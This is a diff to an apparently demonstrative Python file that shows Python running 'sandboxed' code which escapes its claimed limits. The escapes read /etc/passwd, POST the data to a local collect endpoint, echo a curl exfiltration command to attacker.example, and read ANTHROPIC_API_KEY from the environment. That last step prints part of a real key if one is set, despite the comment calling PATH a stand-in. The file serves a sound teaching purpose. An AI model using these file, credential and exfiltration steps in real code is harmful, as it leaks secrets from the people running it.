@@ -7,7 +7,9 @@ same requirement — "local compute only, don't touch files/network/processes."
 
 In Python there is no compiler that can enforce that requirement. The function
 is annotated with a comment that SAYS it's sandboxed. The comment is a lie the
-runtime cannot catch. Run it and watch all three escapes execute.
+runtime cannot catch. Run it and watch all four escapes execute (the last —
+reading a host credential from the environment — is the one Axon's @[contained]
+refuses outright, since the environment can't be granted).
 
     python3 examples/flagship/foil_python.py
 
@@ -17,6 +19,7 @@ point is that the runtime *attempts and permits* them, not that an attacker's
 server is up. The contrast with Axon (which refuses to even build) is the pitch.
 """
 
+import os
 import subprocess
 import urllib.request
 
@@ -31,27 +34,35 @@ def score_and_exfiltrate(quality: int, risk: int, confidence: int) -> int:
     try:
         with open("/etc/passwd") as f:
             secret = f.readline().strip()
-        print(f"  [LEAK 1/3] read /etc/passwd  ->  {secret!r}")
+        print(f"  [LEAK 1/4] read /etc/passwd  ->  {secret!r}")
     except Exception as e:
-        print(f"  [LEAK 1/3] file read attempted (permitted by runtime): {e}")
+        print(f"  [LEAK 1/4] file read attempted (permitted by runtime): {e}")
 
     # (2) Ship the data to a remote endpoint. Nothing stops this.
     try:
         payload = f"q={quality}&r={risk}&secret={secret}".encode()
         req = urllib.request.Request("http://127.0.0.1:9/collect", data=payload)
         urllib.request.urlopen(req, timeout=0.2)
-        print("  [LEAK 2/3] network POST sent")
+        print("  [LEAK 2/4] network POST sent")
     except Exception:
         # The connection fails (no server), but the RUNTIME ALLOWED THE ATTEMPT.
-        print("  [LEAK 2/3] network call attempted and PERMITTED (no compiler said no)")
+        print("  [LEAK 2/4] network call attempted and PERMITTED (no compiler said no)")
 
     # (3) Spawn a process. Nothing stops this.
     try:
         subprocess.run(["echo", "curl -X POST http://attacker.example/collect"],
                        capture_output=True, timeout=1)
-        print("  [LEAK 3/3] process spawned (echo standing in for curl)")
+        print("  [LEAK 3/4] process spawned (echo standing in for curl)")
     except Exception as e:
-        print(f"  [LEAK 3/3] exec attempted (permitted by runtime): {e}")
+        print(f"  [LEAK 3/4] exec attempted (permitted by runtime): {e}")
+
+    # (4) Harvest a host credential from the environment. Nothing stops this —
+    #     even a process with NO file/network grant can read os.environ. This is
+    #     the escape Axon's @[contained] now refuses (env is ungrantable); Python
+    #     hands it over. (We read PATH as a stand-in so the demo prints something
+    #     real without exposing an actual secret.)
+    cred = os.environ.get("ANTHROPIC_API_KEY") or os.environ.get("PATH", "<none>")
+    print(f"  [LEAK 4/4] read host environment (a real API key would leak here): {cred[:24]!r}…")
 
     return s
 
